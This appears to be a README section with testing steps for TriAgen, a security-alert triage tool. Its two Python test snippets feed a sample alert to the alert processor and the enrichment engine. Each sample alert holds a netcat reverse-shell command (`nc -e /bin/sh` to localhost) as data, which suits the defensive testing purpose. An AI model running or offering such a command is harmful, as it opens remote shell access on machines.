## Testing for some of the agents of TriAgen

1. Start CMD.  
2. Navigate to the project root directory.  
3. Run the Python interpreter by typing `python`.  
4. Inside Python, run the following code:

### Test alert processor
```python
from triagen_core.alert_processor import process_alert

alert = {
    "alert_type": "suspicious_command_example",
    "timestamp": "2025-11-21T14:00:00Z",
    "user": "dan",
    "hostname": "lab-ubuntu1",
    "details": {
        "command": "nc -e /bin/sh 127.0.0.1 5555"
    }
}

result = process_alert(alert)
print(result)


### Test enrichment agent
```python
from triagen_core.enrichment_engine import enrich_alert

alert = {
    "alert_type": "suspicious_command",
    "timestamp": "2025-11-21T14:00:00Z",
    "user": "dan",
    "hostname": "lab-ubuntu1",
    "details": {
        "command": "nc -e /bin/sh 127.0.0.1 5555"
    }
}

result = enrich_alert(alert)
print(result)
